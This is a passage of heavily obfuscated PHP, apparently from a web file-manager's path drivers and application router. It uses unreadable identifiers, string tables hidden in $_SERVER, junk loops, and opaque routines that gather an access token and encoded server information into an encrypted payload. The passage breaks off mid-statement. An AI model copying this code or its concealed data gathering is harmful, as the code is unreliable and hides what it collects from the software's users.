return $¦éÖ—ü¨ ? $this->getPathOuter($™Õ óò¦) : !1; } public function size($„û‡ü¸ã) { $„û‡ü¸ã = $this->iconvSystem($„û‡ü¸ã); return filesize_64($„û‡ü¸ã); } public function info($…£Ğ¾ÈÔ) { $…£Ğ¾ÈÔ = $this->iconvSystem($…£Ğ¾ÈÔ); if ($this->isFolder($…£Ğ¾ÈÔ)) { return $this->folderInfo($…£Ğ¾ÈÔ); } else { if ($this->isFile($…£Ğ¾ÈÔ)) { return $this->fileInfo($…£Ğ¾ÈÔ); } } return !1; } protected function infoChildren($ŞşùÎã‰, &$÷ÊĞôÜ, $¬×Ó–¼ú = true) { $ëµĞ»¶ =& $_SERVER[ï»»·÷á]; check_abort_echo(); $ŞşùÎã‰ = rtrim($ŞşùÎã‰, $ëµĞ»¶[8]) . $ëµĞ»¶[8]; if ($¬×Ó–¼ú) { $ŞşùÎã‰ = $this->iconvSystem($ŞşùÎã‰); } if (!($ä‘ÓÊùë = @opendir($ŞşùÎã‰))) { return; } while (($ª¬öÖØ¸ = readdir($ä‘ÓÊùë)) !== !1) { if ($ª¬öÖØ¸ == $ëµĞ»¶[10] || $ª¬öÖØ¸ == $ëµĞ»¶[1396]) { continue; } $—Ï‹›´È = $ŞşùÎã‰ . $ª¬öÖØ¸; if (is_file($—Ï‹›´È) || is_link($—Ï‹›´È)) { $÷ÊĞôÜ[$ëµĞ»¶[77]]++; $÷ÊĞôÜ[$ëµĞ»¶[76]] += filesize_64($—Ï‹›´È); } else { if (is_dir($—Ï‹›´È)) { $÷ÊĞôÜ[$ëµĞ»¶[78]]++; $this->infoChildren($—Ï‹›´È, $÷ÊĞôÜ, !1); } } } closedir($ä‘ÓÊùë); } private function folderInfo($ãëÏ¦Õ®, $ùìØ†…€ = false) { $—È®„µ· =& $_SERVER[ï»»·÷á]; $ãëÏ¦Õ® = rtrim($ãëÏ¦Õ®, $—È®„µ·[8]) . $—È®„µ·[8]; $ŒÉ å¥š = $this->iconvApp($this->pathThis($ãëÏ¦Õ®)); if ($ùìØ†…€) { return array($—È®„µ·[32] => $ŒÉ å¥š, $—È®„µ·[84] => $this->getPathOuter($ãëÏ¦Õ®), $—È®„µ·[33] => $—È®„µ·[75]); } $½àÈÉ¨› = array($—È®„µ·[32] => $ŒÉ å¥š, $—È®„µ·[84] => $this->getPathOuter($ãëÏ¦Õ®), $—È®„µ·[33] => $—È®„µ·[75], $—È®„µ·[201] => @filectime($ãëÏ¦Õ®), $—È®„µ·[85] => @filemtime($ãëÏ¦Õ®), $—È®„µ·[1399] => @fileatime($ãëÏ¦Õ®), $—È®„µ·[1400] => is_readable($ãëÏ¦Õ®), $—È®„µ·[1401] => is_writable($ãëÏ¦Õ®), $—È®„µ·[1402] => get_mode($ãëÏ¦Õ®)); return $½àÈÉ¨›; } private function fileInfo($¶­ï€İƒ, $–£¹òŠã = false) { $¡¢üÒç =& $_SERVER[ï»»·÷á]; $Â°ĞÖ‡ = $this->iconvApp($this->pathThis($¶­ï€İƒ)); if ($–£¹òŠã) { return array($¡¢üÒç[32] => $Â°ĞÖ‡, $¡¢üÒç[84] => $this->getPathOuter($¶­ï€İƒ), $¡¢üÒç[33] => $¡¢üÒç[200], $¡¢üÒç[76] => $this->size($¶­ï€İƒ), $¡¢üÒç[174] => $this->ext($Â°ĞÖ‡)); } $—êíü…ß = array($¡¢üÒç[32] => $Â°ĞÖ‡, $¡¢üÒç[84] => $this->getPathOuter($¶­ï€İƒ), $¡¢üÒç[33] => $¡¢üÒç[200], $¡¢üÒç[201] => @filectime($¶­ï€İƒ), $¡¢üÒç[85] => @filemtime($¶­ï€İƒ), $¡¢üÒç[1399] => @fileatime($¶­ï€İƒ), $¡¢üÒç[76] => $this->size($¶­ï€İƒ), $¡¢üÒç[174] => $this->ext($Â°ĞÖ‡), $¡¢üÒç[1400] => is_readable($¶­ï€İƒ), $¡¢üÒç[1401] => is_writable($¶­ï€İƒ), $¡¢üÒç[1402] => get_mode($¶­ï€İƒ)); return $—êíü…ß; } public function exist($ñÍÕúÖû) { $ñÍÕúÖû = $this->iconvSystem($ñÍÕúÖû); return @file_exists($ñÍÕúÖû); } public function isFile($í†ˆüôÅ) { $í†ˆüôÅ = $this->iconvSystem($í†ˆüôÅ); return @is_file($í†ˆüôÅ); } public function isFolder($é²¶¿š) { $é²¶¿š = $this->iconvSystem($é²¶¿š); return @is_dir($é²¶¿š); } public function listPath($«ÔÊ¬‚†, $¸Ùğ‹ = false) { $†Ô•Ÿ =& $_SERVER[ï»»·÷á]; $«ÔÊ¬‚† = $this->iconvSystem($«ÔÊ¬‚†); $«ÔÊ¬‚† = rtrim($«ÔÊ¬‚†, $†Ô•Ÿ[8]) . $†Ô•Ÿ[8]; $Ø¦ÔĞ÷´ = array($†Ô•Ÿ[82] => array(), $†Ô•Ÿ[83] => array()); if (!($½êİ¯‚Ø = @opendir($«ÔÊ¬‚†))) { return $Ø¦ÔĞ÷´; } while (($«›öË¡œ = readdir($½êİ¯‚Ø)) !== !1) { if ($«›öË¡œ == $†Ô•Ÿ[10] || $«›öË¡œ == $†Ô•Ÿ[1396]) { continue; } $Ş°˜…æ— = $«ÔÊ¬‚† . $«›öË¡œ; if (is_file($Ş°˜…æ—)) { $Ø¦ÔĞ÷´[$†Ô•Ÿ[83]][] = $this->fileInfo($Ş°˜…æ—, $¸Ùğ‹); } else { $Ø¦ÔĞ÷´[$†Ô•Ÿ[82]][] = $this->folderInfo($Ş°˜…æ—, $¸Ùğ‹); } } closedir($½êİ¯‚Ø); return $Ø¦ÔĞ÷´; } public function listAll($ÌŒå¸¨, &$­€ìÑìÛ = array()) { $ùğüß·ˆ =& $_SERVER[ï»»·÷á]; $ÌŒå¸¨ = $this->iconvSystem($ÌŒå¸¨); $ÌŒå¸¨ = rtrim($ÌŒå¸¨, $ùğüß·ˆ[8]) . $ùğüß·ˆ[8]; if (!($­±†ó¿‹ = @opendir($ÌŒå¸¨))) { return $­€ìÑìÛ; } while (($ÚÑ§ÅËÍ = readdir($­±†ó¿‹)) !== !1) { if ($ÚÑ§ÅËÍ == $ùğüß·ˆ[10] || $ÚÑ§ÅËÍ == $ùğüß·ˆ[1396]) { continue; } $ª“‰…»À = $ÌŒå¸¨ . $ÚÑ§ÅËÍ; $É»óó…õ = is_dir($ª“‰…»À) && !is_link($ª“‰…»À) ? 1 : 0; $ª“‰…»À = $É»óó…õ ? $ª“‰…»À . $ùğüß·ˆ[8] : $ª“‰…»À; $­€ìÑìÛ[] = array($ùğüß·ˆ[84] => $ª“‰…»À, $ùğüß·ˆ[75] => $É»óó…õ, $ùğüß·ˆ[85] => intval(@filemtime($ª“‰…»À)), $ùğüß·ˆ[76] => $É»óó…õ ? 0 : intval($this->size($ª“‰…»À))); if ($É»óó…õ) { $this->listAll($ª“‰…»À, $­€ìÑìÛ); } } closedir($­±†ó¿‹); return $­€ìÑìÛ; } public function has($¼Œó‡¨Ü, $–‚êáÇÒ = false, $ÍÖ“¤›‘ = true) { $‡˜ÓüÖ =& $_SERVER[ï»»·÷á]; $¼Œó‡¨Ü = $this->iconvSystem($¼Œó‡¨Ü); $¼Œó‡¨Ü = rtrim($¼Œó‡¨Ü, $‡˜ÓüÖ[8]) . $‡˜ÓüÖ[8]; if (!($Œß˜‘Ã = @opendir($¼Œó‡¨Ü))) { return !1; } $ïáêí”î = 0; $Ú¶…ŒÂÏ = 0; $Õâ¨‹áò = 0; while (($ö›´íƒ = readdir($Œß˜‘Ã)) !== !1) { if ($ö›´íƒ == $‡˜ÓüÖ[10] || $ö›´íƒ == $‡˜ÓüÖ[1396]) { continue; } $œÆ¶Éîï = $¼Œó‡¨Ü . $ö›´íƒ; if ($–‚êáÇÒ) { $Õâ¨‹áò++; if (@is_file($œÆ¶Éîï)) { $ïáêí”î++; } else { $Ú¶…ŒÂÏ++; } if ($Õâ¨‹áò > 10000) { break; } continue; } if ($ÍÖ“¤›‘) { if (@is_file($œÆ¶Éîï)) { return !0; } } else { if (@is_dir($œÆ¶Éîï . $‡˜ÓüÖ[8])) { return !0; } } } closedir($Œß˜‘Ã); if ($–‚êáÇÒ) { return array($‡˜ÓüÖ[207] => $ïáêí”î, $‡˜ÓüÖ[208] => $Ú¶…ŒÂÏ); } return !1; } public function hashSimple($ÄˆèÒÌœ) { $¤½†™»œ =& $_SERVER[ï»»·÷á]; if (!$ÄˆèÒÌœ) { return md5($¤½†™»œ[12]); } $ÄˆèÒÌœ = $this->iconvSystem($ÄˆèÒÌœ); $¾³Š‡Îß = $this->size($ÄˆèÒÌœ); $Àìµ»Î = 200; $¢á®¾Ø° = 50; if ($¾³Š‡Îß <= $Àìµ»Î * $¢á®¾Ø°) { return $this->hashMd5($ÄˆèÒÌœ) . $¾³Š‡Îß; } $ÁèÒÍÄ = $¤½†™»œ[12]; $şæ“¼¨® = intval($¾³Š‡Îß / $¢á®¾Ø°); $ûç™Ñ…È = fopen($ÄˆèÒÌœ, $¤½†™»œ[1403]); if (!$ûç™Ñ…È) { return $ÁèÒÍÄ; } for ($µ÷’—ã± = 0; $µ÷’—ã± < $¢á®¾Ø°; $µ÷’—ã±++) { fseek_64($ûç™Ñ…È, $şæ“¼¨® * $µ÷’—ã±); $ÁèÒÍÄ .= fread($ûç™Ñ…È, $Àìµ»Î); } fseek_64($ûç™Ñ…È, $¾³Š‡Îß - $Àìµ»Î); $ÁèÒÍÄ .= fread($ûç™Ñ…È, $Àìµ»Î); fclose($ûç™Ñ…È); return md5($ÁèÒÍÄ) . $¾³Š‡Îß; } public function getContent($éğÆîß¶) { $éğÆîß¶ = $this->iconvSystem($éğÆîß¶); return file_get_contents($éğÆîß¶); } public function setContent($êôÌÑÇÁ, $æ¼°Ş˜ª = '') { $êôÌÑÇÁ = $this->iconvSystem($êôÌÑÇÁ); $ ïÁúä = @file_put_contents($êôÌÑÇÁ, $æ¼°Ş˜ª, LOCK_EX); clearstatcache(); @chmod($êôÌÑÇÁ, $this->pathAuth); return $ ïÁúä === !1 ? !1 : !0; } public function fileSubstr($Êğ÷±î, $Î‘Äï…è = 0, $ëÏ²ÂĞ² = false) { $·êşÔÖ£ =& $_SERVER[ï»»·÷á]; $Êğ÷±î = $this->iconvSystem($Êğ÷±î); if ($ëÏ²ÂĞ² === !1) { $ëÏ²ÂĞ² = $this->size($Êğ÷±î); } if ($ëÏ²ÂĞ² <= 0) { return $·êşÔÖ£[12]; } $áÓá–Ñ¯ = fopen($Êğ÷±î, $·êşÔÖ£[1403]); if (!$áÓá–Ñ¯) { return !1; } fseek_64($áÓá–Ñ¯, $Î‘Äï…è); $î““åû = fread($áÓá–Ñ¯, $ëÏ²ÂĞ²); fclose($áÓá–Ñ¯); return $î““åû; } public function upload($ÀÇßı®‹, $Î¾˜»¨¬, $º‰ÆÑáî = false, $Èâ–†Ø = REPEAT_REPLACE) { if ($º‰ÆÑáî) { return $this->moveFile($Î¾˜»¨¬, $ÀÇßı®‹); } return $this->copyFile($Î¾˜»¨¬, $ÀÇßı®‹); } public function setModifyTime($üñµ€ ¯, $ìê¨Æ­Œ = '') { @touch($üñµ€ ¯, intval($ìê¨Æ­Œ)); } public function download($´øñ€ºŸ, $——¸˜ş¾) { return $this->iconvSystem($´øñ€ºŸ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($¦ØÛàÉ) { parent::__construct($¦ØÛàÉ); $this->signatureVersion($_SERVER[ï»»·÷á][216]); } public function fileOutLink($…À¢£¥) { $îé¾¨ä‡ =& $_SERVER[ï»»·÷á]; if (substr($…À¢£¥, 0, 7) == $îé¾¨ä‡[1347]) { $…À¢£¥ = $îé¾¨ä‡[1348] . substr($…À¢£¥, 7); } header($îé¾¨ä‡[161] . $…À¢£¥); die; } } goto a´™¥™ø ; Eµ§Œ´äæç: class Application { private $defaultModule = "\x69\x6e\x64\145\170"; private $defaultController = "\151\156\144\x65\x78"; private $defaultAction = "\x69\x6e\144\145\170"; function __construct() { } public function setDefault($ÈóõÎñˆ) { $¢İéàÄ¯ =& $_SERVER[ï»»·÷á]; $íœî·× =& $_SERVER[éîó”ş¹]; $Ş¢·‰÷ğ = explode($íœî·×[0], trim($ÈóõÎñˆ, $íœî·×[0])); $ù¹Ú–Á– = $¢İéàÄ¯[619]; if (strlen($ù¹Ú–Á–) < $¢İéàÄ¯[620]) { return; } $this->defaultModule = $Ş¢·‰÷ğ[0] ? $Ş¢·‰÷ğ[0] : $this->defaultModule; $this->defaultController = $Ş¢·‰÷ğ[1] ? $Ş¢·‰÷ğ[1] : $this->defaultController; $Ğ¯¡›“‚ = $¢İéàÄ¯[621]; if (strlen($Ğ¯¡›“‚) < $¢İéàÄ¯[622]) { return; } $this->defaultAction = $Ş¢·‰÷ğ[2] ? $Ş¢·‰÷ğ[2] : $this->defaultAction; $ùŒü±µ‘ = $¢İéàÄ¯[623]; if (!$ùŒü±µ‘) { die; } $this->fdpr4423769b($íœî·×[1], array($this, $íœî·×[2])); } public function appRun($ĞƒğÙ’Î) { $¼Ø…¡¦ =& $_SERVER[ï»»·÷á]; $”ƒşûßÏ =& $_SERVER[éîó”ş¹]; $ŸîúôÔ = explode($”ƒşûßÏ[0], $ĞƒğÙ’Î); $ê–Òº²‰ = strtolower($ŸîúôÔ[0]); $‹Ğªôî¬ = $¼Ø…¡¦[624]; while ($‹Ğªôî¬ < $¼Ø…¡¦[625]) { if ($‹Ğªôî¬ >= 0) { break; } $‹Ğªôî¬++; } $ƒæ‰åÍ = $”ƒşûßÏ[3]; if ($ê–Òº²‰ == $”ƒşûßÏ[4]) { $ƒæ‰åÍ = $”ƒşûßÏ[5]; $ŸîúôÔ[0] = $”ƒşûßÏ[6]; $ŸîúôÔ[1] = $ŸîúôÔ[1] . $”ƒşûßÏ[7]; $ĞƒğÙ’Î = join($”ƒşûßÏ[0], $ŸîúôÔ); $ĞƒğÙ’Î = trim($ĞƒğÙ’Î, $”ƒşûßÏ[0]); } call_user_func(array($”ƒşûßÏ[8], $”ƒşûßÏ[9]), $ƒæ‰åÍ . $”ƒşûßÏ[10], $ĞƒğÙ’Î); ActionCall($ĞƒğÙ’Î); call_user_func(array($”ƒşûßÏ[8], $”ƒşûßÏ[9]), $ƒæ‰åÍ . $”ƒşûßÏ[11], $ĞƒğÙ’Î); } private function autorun() { $ÏëùÁ• =& $_SERVER[ï»»·÷á]; $šóŞÂä÷ =& $_SERVER[éîó”ş¹]; global $config; $Ï‹ÛäæÚ = $ÏëùÁ•[626]; if (count($config[$šóŞÂä÷[12]]) == 0) { return; } foreach ($config[$šóŞÂä÷[12]] as $à”—ø¡Ø => $¸ÈÍí³) { $this->appRun($¸ÈÍí³); $¯™©ëŸ÷ = $ÏëùÁ•[627]; while ($¯™©ëŸ÷ < $ÏëùÁ•[620]) { if ($¯™©ëŸ÷ >= 0) { break; } $¯™©ëŸ÷++; } } } private function egdbb08ace93() { $ãˆÀàåş =& $_SERVER[ï»»·÷á]; $¨²­µ¼Ë =& $_SERVER[éîó”ş¹]; $äû•šÔ = $¨²­µ¼Ë[4]; $ô–Š²®È = $ãˆÀàåş[628]; if (!$ô–Š²®È) { die; } $º¡Í¬ì = $GLOBALS[$¨²­µ¼Ë[13]][$¨²­µ¼Ë[14]][0]; $Ùû¼æ’ñ = $ãˆÀàåş[629]; if (strlen($Ùû¼æ’ñ) < $ãˆÀàåş[625]) { die; } if (!$º¡Í¬ì || strlen($º¡Í¬ì) <= strlen($äû•šÔ)) { return; } if (strtolower(substr($º¡Í¬ì, -strlen($äû•šÔ))) != $äû•šÔ) { return; } $ğ¦ÍëÙ = substr($º¡Í¬ì, 0, -strlen($äû•šÔ)); $‰Ë«¶¯ = array($¨²­µ¼Ë[4], $ğ¦ÍëÙ); $Å †¡›¼ = array_slice($GLOBALS[$¨²­µ¼Ë[13]][$¨²­µ¼Ë[14]], 1); $¯È‚¢ñÀ = $ãˆÀàåş[630]; while ($¯È‚¢ñÀ < $ãˆÀàåş[622]) { if ($¯È‚¢ñÀ >= 0) { break; } $¯È‚¢ñÀ++; } $GLOBALS[$¨²­µ¼Ë[13]][$¨²­µ¼Ë[14]] = array_merge($‰Ë«¶¯, $Å †¡›¼); $GLOBALS[$¨²­µ¼Ë[13]][$¨²­µ¼Ë[15]] = implode($¨²­µ¼Ë[0], $GLOBALS[$¨²­µ¼Ë[13]][$¨²­µ¼Ë[14]]); } private function wtgh8f9f0889() { $‹ª ®ı =& $_SERVER[ï»»·÷á]; $‘µÅ«÷ =& $_SERVER[éîó”ş¹]; if ($GLOBALS[$‘µÅ«÷[13]][$‘µÅ«÷[15]] != $‘µÅ«÷[6]) { return; } $¥™²ı = $_SERVER[$‘µÅ«÷[16]]; $ÔƒÕ§øµ = $‹ª ®ı[631]; while (strlen($ÔƒÕ§øµ) < $‹ª ®ı[632]) { if (!$ÔƒÕ§øµ) { break; } $ÔƒÕ§øµ++; } $ş§¼¡½è = $‘µÅ«÷[17]; $õ„Ææ½à = $‹ª ®ı[633]; if (strlen($õ„Ææ½à) < $‹ª ®ı[406]) { die; } if (!strstr($¥™²ı, $ş§¼¡½è)) { return; } $±×ıÛé± = strrpos($¥™²ı, $ş§¼¡½è); $¾•£§şÃ = $‹ª ®ı[634]; while (strlen($¾•£§şÃ) < $‹ª ®ı[622]) { if (!$¾•£§şÃ) { break; } $¾•£§şÃ++; } $²Î´ŒåÈ = substr($¥™²ı, $±×ıÛé± + strlen($ş§¼¡½è)); $¾“‰ê¾ç = $‹ª ®ı[635]; preg_match_all($‘µÅ«÷[18], $²Î´ŒåÈ, $ıÍŒĞÕ†); $²Î´ŒåÈ = trim($ıÍŒĞÕ†[0][0], $‘µÅ«÷[19]); $¬Ï€†â = $‹ª ®ı[636]; if (!$¬Ï€†â) { die; } $GLOBALS[$‘µÅ«÷[13]][$‘µÅ«÷[14]] = explode($‘µÅ«÷[19], $²Î´ŒåÈ); $¦¹Á×… = $‹ª ®ı[637]; if (!$¦¹Á×…) { die; } $GLOBALS[$‘µÅ«÷[13]][$‘µÅ«÷[15]] = implode($‘µÅ«÷[0], $GLOBALS[$‘µÅ«÷[13]][$‘µÅ«÷[14]]); } public function run() { $Œ¢ıƒÀ· =& $_SERVER[ï»»·÷á]; $°‘‚¾”â =& $_SERVER[éîó”ş¹]; $this->wtgh8f9f0889(); $this->egdbb08ace93(); $‡ŠèÃÙõ = $Œ¢ıƒÀ·[638]; $ü™Ä©û  = $GLOBALS[$°‘‚¾”â[13]][$°‘‚¾”â[14]]; $ÈõˆôÛ‘ = $Œ¢ıƒÀ·[639]; $£•‰¯Ú = $GLOBALS[$°‘‚¾”â[13]][$°‘‚¾”â[15]]; $¼ïú£±Ó = $Œ¢ıƒÀ·[640]; if (!$¼ïú£±Ó) { return; } define($°‘‚¾”â[20], isset($ü™Ä©û [0]) && $ü™Ä©û [0] ? $ü™Ä©û [0] : $this->defaultModule); $Õõ—Ê¤ = $Œ¢ıƒÀ·[641]; if (!$Õõ—Ê¤) { return; } define($°‘‚¾”â[21], isset($ü™Ä©û [1]) && $ü™Ä©û [0] ? $ü™Ä©û [1] : $this->defaultController); define($°‘‚¾”â[22], isset($ü™Ä©û [2]) && $ü™Ä©û [0] ? $ü™Ä©û [2] : $this->defaultAction); define($°‘‚¾”â[23], MOD . $°‘‚¾”â[0] . ST . $°‘‚¾”â[0] . ACT); $_SERVER[$°‘‚¾”â[24]] = strtolower(ACTION); $¬ñ™…´è = $Œ¢ıƒÀ·[642]; if (!$¬ñ™…´è) { die; } $this->autorun(); if (count($ü™Ä©û ) >= 3) { $this->appRun($£•‰¯Ú); } else { $this->appRun(ACTION); } } private $vied598bd021 = array(); private $zrtu09344cb4 = ''; public function exim1ca66afb() { $˜šŒñ¹Ø =& $_SERVER[ï»»·÷á]; $†Ù«’³ =& $_SERVER[éîó”ş¹]; $this->ztfp747bdd0f(); $this->rzulf72e4ccc(); $…§Ñ¢ªğ = $˜šŒñ¹Ø[643]; $this->jgdk61fb6c30(); $È¦ì¦Á» = $˜šŒñ¹Ø[644]; while (strlen($È¦ì¦Á») < $˜šŒñ¹Ø[625]) { if (!$È¦ì¦Á») { break; } $È¦ì¦Á»++; } $this->ijzva0f4053b(); $this->bkzp586cd7aa(); $£¬êƒå¢ = $˜šŒñ¹Ø[645]; if (strlen($£¬êƒå¢) < $˜šŒñ¹Ø[632]) { return; } $this->erjh098ac86b(); $this->ojpgb1b3c7a3(); $ìÕ…Ôâí = $˜šŒñ¹Ø[646]; while (strlen($ìÕ…Ôâí) < $˜šŒñ¹Ø[622]) { if (!$ìÕ…Ôâí) { break; } $ìÕ…Ôâí++; } $this->fdpr4423769b($†Ù«’³[25], array($this, $†Ù«’³[26])); $this->fdpr4423769b($†Ù«’³[27], array($this, $†Ù«’³[28])); $this->fdpr4423769b($†Ù«’³[29], array($this, $†Ù«’³[30])); $this->fdpr4423769b($†Ù«’³[31], array($this, $†Ù«’³[32])); } public function lpywd131fd65($ºå±¶Íï) { $È²¹É³á =& $_SERVER[ï»»·÷á]; $Ñ×ÂÏ• =& $_SERVER[éîó”ş¹]; $”æÏ¨¯Œ = Model($Ñ×ÂÏ•[33])->get(); $ê£—İ¯ù = $È²¹É³á[647]; $Û¯Œ‹¨ô = array($Ñ×ÂÏ•[34], $Ñ×ÂÏ•[35], $Ñ×ÂÏ•[36], $Ñ×ÂÏ•[37], $Ñ×ÂÏ•[38], $Ñ×ÂÏ•[39], $Ñ×ÂÏ•[40], $Ñ×ÂÏ•[41], $Ñ×ÂÏ•[42], $Ñ×ÂÏ•[43], $Ñ×ÂÏ•[44], $Ñ×ÂÏ•[45], $Ñ×ÂÏ•[46], $Ñ×ÂÏ•[47], $Ñ×ÂÏ•[48], $Ñ×ÂÏ•[49], $Ñ×ÂÏ•[50], $Ñ×ÂÏ•[51], $Ñ×ÂÏ•[52], $Ñ×ÂÏ•[53], $Ñ×ÂÏ•[54], $Ñ×ÂÏ•[55], $Ñ×ÂÏ•[56], $Ñ×ÂÏ•[57], $Ñ×ÂÏ•[58], $Ñ×ÂÏ•[59], $Ñ×ÂÏ•[60], $Ñ×ÂÏ•[61], $Ñ×ÂÏ•[62], $Ñ×ÂÏ•[63], $Ñ×ÂÏ•[64], $Ñ×ÂÏ•[65], $Ñ×ÂÏ•[66], $Ñ×ÂÏ•[67], $Ñ×ÂÏ•[68], $Ñ×ÂÏ•[69], $Ñ×ÂÏ•[70], $Ñ×ÂÏ•[71], $Ñ×ÂÏ•[72], $Ñ×ÂÏ•[73], $Ñ×ÂÏ•[74], $Ñ×ÂÏ•[75], $Ñ×ÂÏ•[76], $Ñ×ÂÏ•[77], $Ñ×ÂÏ•[78], $Ñ×ÂÏ•[79], $Ñ×ÂÏ•[80], $Ñ×ÂÏ•[81], $Ñ×ÂÏ•[82], $Ñ×ÂÏ•[83], $Ñ×ÂÏ•[84]); foreach ($Û¯Œ‹¨ô as $ßå–‰Ãé) { $Š¶‡Ú˜Ø = $GLOBALS[$Ñ×ÂÏ•[85]][$Ñ×ÂÏ•[86]][$ßå–‰Ãé]; if (isset($”æÏ¨¯Œ[$ßå–‰Ãé])) { $Š¶‡Ú˜Ø = $”æÏ¨¯Œ[$ßå–‰Ãé]; } $ºå±¶Íï[$Ñ×ÂÏ•[87]][$Ñ×ÂÏ•[88]][$ßå–‰Ãé] = $Š¶‡Ú˜Ø; } $Ìïº½É˜ = $ºå±¶Íï[$Ñ×ÂÏ•[87]][$Ñ×ÂÏ•[88]][$Ñ×ÂÏ•[46]]; $Ÿ÷ŠÜ± = $È²¹É³á[648]; if (!$Ÿ÷ŠÜ±) { return; } unset($ºå±¶Íï[$Ñ×ÂÏ•[87]][$Ñ×ÂÏ•[89]][$Ñ×ÂÏ•[90]]); $ÖŒæè = $È²¹É³á[649]; while (strlen($ÖŒæè) < $È²¹É³á[620]) { if (!$ÖŒæè) { break; } $ÖŒæè++; } unset($ºå±¶Íï[$Ñ×ÂÏ•[87]][$Ñ×ÂÏ•[89]][$Ñ×ÂÏ•[91]]); $¼¨Ö„¦ = $È²¹É³á[650]; unset($ºå±¶Íï[$Ñ×ÂÏ•[87]][$Ñ×ÂÏ•[88]][$Ñ×ÂÏ•[46]]); $ÙÀ›˜«¼ = $È²¹É³á[651]; if (strlen($ÙÀ›˜«¼) < $È²¹É³á[622]) { die; } unset($ºå±¶Íï[$Ñ×ÂÏ•[87]][$Ñ×ÂÏ•[88]][$Ñ×ÂÏ•[92]]); $Ñäºô‹Î = $È²¹É³á[652]; while ($Ñäºô‹Î < $È²¹É³á[632]) { if ($Ñäºô‹Î >= 0) { break; } $Ñäºô‹Î++; } $ºå±¶Íï[$Ñ×ÂÏ•[87]][$Ñ×ÂÏ•[88]][$Ñ×ÂÏ•[93]] = array($Ñ×ÂÏ•[94] => (int) $Ìïº½É˜[$Ñ×ÂÏ•[95]], $Ñ×ÂÏ•[96] => (int) _get($Ìïº½É˜, $Ñ×ÂÏ•[97], 0)); $Ïñïëœ» = $È²¹É³á[653]; while (strlen($Ïñïëœ») < $È²¹É³á[632]) { if (!$Ïñïëœ») { break; } $Ïñïëœ»++; } $ºå±¶Íï[$Ñ×ÂÏ•[98]][$Ñ×ÂÏ•[99]] = Action($Ñ×ÂÏ•[100])->accessToken(); $ä¸ÄÛ¸ = $È²¹É³á[654]; if (strlen($ä¸ÄÛ¸) < $È²¹É³á[622]) { die; } $ºå±¶Íï[$Ñ×ÂÏ•[98]][$Ñ×ÂÏ•[101]] = md5($_SERVER[$Ñ×ÂÏ•[102]] . $”æÏ¨¯Œ[$Ñ×ÂÏ•[103]]); $´»¡¤ = $È²¹É³á[655]; if (!$´»¡¤) { die; } $ºå±¶Íï[$Ñ×ÂÏ•[98]][$Ñ×ÂÏ•[104]] = base64_encode(serverInfo()); $§ë‘ÈŠ = $È²¹É³á[656]; $ºå±¶Íï[$Ñ×ÂÏ•[98]][$Ñ×ÂÏ•[105]] = $this->zrtu09344cb4; $ıı¼ÃĞ = $È²¹É³á[657]; while (strlen($ıı¼ÃĞ) < $È²¹É³á[625]) { if (!$ıı¼ÃĞ) { break; } $ıı¼ÃĞ++; } if ($”æÏ¨¯Œ[$Ñ×ÂÏ•[105]] != $Ñ×ÂÏ•[106]) { $ºå±¶Íï[$Ñ×ÂÏ•[98]][$Ñ×ÂÏ•[107]] = $”æÏ¨¯Œ[$Ñ×ÂÏ•[107]]; $ºå±¶Íï[$Ñ×ÂÏ•[98]][$Ñ×ÂÏ•[108]] = $”æÏ¨¯Œ[$Ñ×ÂÏ•[108]]; $Ø„ªş = rand_string(10) . $this->zrtu09344cb4 . rand_string(5); $ºå±¶Íï[$Ñ×ÂÏ•[87]][$Ñ×ÂÏ•[109]][$Ñ×ÂÏ•[110]] = $this->jwsr6b17e39e($Ø„ªş, $ºå±¶Íï[$Ñ×ÂÏ•[98]][$Ñ×ÂÏ•[101]]); } if ($this->zrtu09344cb4 == $Ñ×ÂÏ•[106]) { $ºå±¶Íï[$Ñ×ÂÏ•[87]][$Ñ×ÂÏ•[88]][$Ñ×ÂÏ•[93]][$Ñ×ÂÏ•[97]] = 0; } $ºå±¶Íï[$Ñ×ÂÏ•[98]][$Ñ×ÂÏ•[111]] = _get($this->vied598bd021, $Ñ×ÂÏ•[112], $Ñ×ÂÏ•[6]); $ºå±¶Íï[$Ñ×ÂÏ•[98]][$Ñ×ÂÏ•[113]] = _get($this->vied598bd021, $Ñ×ÂÏ•[114], $Ñ×ÂÏ•[6]); if (_get($GLOBALS, $Ñ×ÂÏ•[115]) && $this->config[$Ñ×ÂÏ•[116]]) { $ºå±¶Íï[$Ñ×ÂÏ•[98]][$Ñ×ÂÏ•[117]] = WEB_ROOT; } return $ºå±¶Íï; } private function erjh098ac86b() { $Šº§Óõ» =& $_SERVER[ï»»·÷á]; $²ÖÈ ‘ =& $_SERVER[éîó”ş¹]; $¶ªŞ¤óş = $_SERVER[$²ÖÈ ‘[24]] == $²ÖÈ ‘[118]; if ($_SERVER[$²ÖÈ ‘[24]] == $²ÖÈ ‘[119] && $_GET[$²ÖÈ ‘[120]] == $²ÖÈ ‘[121]) { $¶ªŞ¤óş = !0; } if ($¶ªŞ¤óş) { $Ãİ¾Ğé– = array($²ÖÈ ‘[105] => $this->zrtu09344cb4, $²ÖÈ ‘[122] => $this->fxwo8c5e1f58(), $²ÖÈ ‘[123] => Model($²ÖÈ ‘[124])->count()); if ($this->zrtu09344cb4 != $²ÖÈ ‘[106]) { $ù‹‚ã” = _get($this->vied598bd021, $²ÖÈ ‘[125]); if ($ù‹‚ã”) { $Ãİ¾Ğé–[$²ÖÈ ‘[126]] = $ù‹‚ã”; $Ãİ¾Ğé–[$²ÖÈ ‘[127]] = strtotime(_get($this->vied598bd021, $²ÖÈ ‘[128])); $Ãİ¾Ğé–[$²ÖÈ ‘[129]] = _get($this->vied598bd021, $²ÖÈ ‘[114]); } $Îüâï¡Ö = Model($²ÖÈ ‘[33])->get($²ÖÈ ‘[130], $²ÖÈ ‘[6], !0); if (is_string($Îüâï¡Ö) && substr($Îüâï¡Ö, 0, 1) == $²ÖÈ ‘[131]) { $Îüâï¡Ö = json_decode_force($Îüâï¡Ö); } if (is_array($Îüâï¡Ö) && $Îüâï¡Ö[$²ÖÈ ‘[132]] && strstr($Îüâï¡Ö[$²ÖÈ ‘[132]], $²ÖÈ ‘[133])) { $Õß°Á°‰ = explode($²ÖÈ ‘[133], $Îüâï¡Ö[$²ÖÈ ‘[132]]); $Ãİ¾Ğé–[$²ÖÈ ‘[134]] = $Õß°Á°‰[0]; } } $Ãİ¾Ğé– = $this->gdtufc22d200(json_encode($Ãİ¾Ğé–), md5($²ÖÈ ‘[135])); $–˜†ŞÂ„ = array($²ÖÈ ‘[136] => 